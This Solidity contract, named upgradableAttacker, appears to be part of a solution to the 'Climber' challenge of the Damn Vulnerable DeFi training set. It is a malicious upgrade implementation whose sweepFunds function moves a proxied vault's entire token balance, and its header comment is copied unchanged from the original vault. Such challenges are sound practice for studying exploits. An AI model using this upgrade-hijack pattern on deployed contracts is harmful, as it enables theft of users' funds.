// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract upgradableAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function initialize(address admin, address proposer, address sweeper) initializer external {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(_sweeper, token.balanceOf(address(this))), "Transfer failed");
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
